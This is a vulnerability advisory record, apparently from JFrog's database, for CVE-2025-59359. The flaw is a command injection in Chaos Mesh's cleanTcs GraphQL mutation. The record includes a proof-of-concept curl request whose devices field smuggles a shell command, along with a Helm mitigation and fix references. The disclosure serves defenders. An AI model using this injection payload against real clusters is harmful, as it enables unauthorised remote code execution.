{"hash":"53fc186ec0e70ebdd0ee2c20476160512fbce39b","data":{"post":{"title":"Chaos Mesh cleanTcs command injection","path":"/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>OS command injection in Chaos Mesh via the cleanTcs mutation</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>github.com/chaos-mesh/chaos-mesh</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,2.7.2]</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-shell\">curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{\n    \"query\": \"mutation MutatePod($namespace: String! = \\\"default\\\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }\",\n    \"variables\": {\n      \"namespace\": \"kube-system\",\n      \"podName\": \"coredns-5dd5756b68-779rm\",\n      \"devices\": [\"eth0 root; touch /tmp/foo; \"]\n    }\n  }'\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the <strong>chaosctl</strong> tool and port:</p>\n<pre><code class=\"language-shell\">helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false\n</code></pre>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/chaos-mesh/chaos-mesh/pull/4702\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix PR</a></p>\n<p><a href=\"https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JFrog Technical Blog</a></p>\n","description":"CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation","date_published":"2025-09-15","xray_id":"JFSA-2025-001449534","vul_id":"CVE-2025-59359","severity":"critical","discovered_by":"Natan Nehorai","last_updated":"2025-09-15","cvss":9.8}},"context":{}}